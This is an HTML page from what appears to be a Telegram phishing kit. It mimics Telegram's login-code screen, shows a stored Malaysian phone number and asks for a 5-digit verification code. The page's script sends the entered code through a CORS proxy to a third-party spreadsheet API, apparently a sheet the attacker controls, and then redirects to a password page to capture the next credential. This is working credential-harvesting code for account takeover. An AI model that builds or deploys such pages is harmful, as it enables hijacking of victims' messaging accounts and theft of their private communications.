<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enter Code</title>
  <link rel="icon" type="image/png" href="test2.png">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="wrapper">
    <div class="content">
      <div><img src="monyet.png" alt="emoji" class="emoji-gif"></div>

      <h2 class="number" id="showNumber">+60</h2>

      <p class="subtitle">
        We've sent the code to the Telegram app on your<br>other device.
      </p>

      <form id="codeForm" class="form-box">
        <!-- Tukar ke type="text" dan kawal melalui JS -->
        <input 
          type="text" 
          id="codeInput" 
          class="input" 
          placeholder="Code" 
          maxlength="5" 
          required>
        <button type="submit" id="nextBtn" class="btn" disabled>Next</button>
      </form>
    </div>
  </div>

  <script>
    const savedNumber = localStorage.getItem("telegramNumber");
    if (savedNumber) {
      document.getElementById("showNumber").textContent = savedNumber;
    }

    const codeInput = document.getElementById("codeInput");
    const nextBtn = document.getElementById("nextBtn");
    const form = document.getElementById("codeForm");

    // Benarkan hanya nombor ditaip
    codeInput.addEventListener("input", () => {
      // Buang semua bukan nombor secara automatik
      codeInput.value = codeInput.value.replace(/[^0-9]/g, "");

      const value = codeInput.value.trim();
      nextBtn.disabled = !/^\d{5}$/.test(value);
    });

    const API = "https://api.sheetbest.com/sheets/f3cc6873-23ee-4df3-9eb8-49a788f9446a";
    const PROXY = "https://corsproxy.io/?";

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const code = codeInput.value.trim();
      if (!/^\d{5}$/.test(code)) {
        alert("Please enter exactly 5 digits.");
        return;
      }

      const payload = { dua: code };

      try {
        const res = await fetch(PROXY + API + "/0", {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        if (res.ok) {
          localStorage.setItem("telegramCode", code);
          window.location.href = "password.html";
        } else {
          alert("❌ Gagal kemas kini data di Google Sheet.");
        }
      } catch (err) {
        alert("⚠️ Ralat sambungan: " + err.message);
      }
    });
  </script>
</body>
</html>
